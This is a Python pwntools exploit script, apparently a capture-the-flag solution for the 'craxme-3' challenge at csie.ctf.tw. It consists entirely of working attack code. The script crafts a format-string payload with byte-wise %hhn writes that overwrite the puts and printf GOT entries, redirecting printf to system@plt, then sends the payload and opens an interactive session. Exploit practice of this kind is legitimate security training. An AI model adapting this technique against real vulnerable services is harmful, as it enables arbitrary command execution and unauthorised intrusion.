#!/usr/bin/env python

from pwn import *

r = remote("csie.ctf.tw", 10134)
# r = process('./craxme-3')
context.arch = 'amd64'

def fmt(pre, val, idx):
    if pre < val:
        res = '%{}c'.format(val - pre)
    elif pre == val:
        res = ''
    else:
        res = '%{}c'.format(val - pre + 256)
    res += '%{}$hhn'.format(idx)
    return res

r.recvuntil(':')

puts_got = 0x601018
printf_got = 0x601030
system_plt = 0x4005a0
payload = ''
target = 0x400747
pre = 0

for i in xrange(6):
    payload += fmt(pre, (target >> 8 * i) & 0xff, 22 + i + 4)
    pre = (target >> i * 8) & 0xff

for i in xrange(6):
    payload += fmt(pre, (system_plt >> 8 * i) & 0xff, 22 + i + 4 + 6)
    pre = (system_plt >> i * 8) & 0xff

payload = payload.ljust(0x80 + 0x20, 'a') + flat([puts_got, puts_got + 1, puts_got + 2, puts_got + 3, puts_got + 4, puts_got + 5, printf_got, printf_got + 1, printf_got + 2, printf_got + 3, printf_got + 4, printf_got + 5])

r.sendline(payload)

r.interactive()
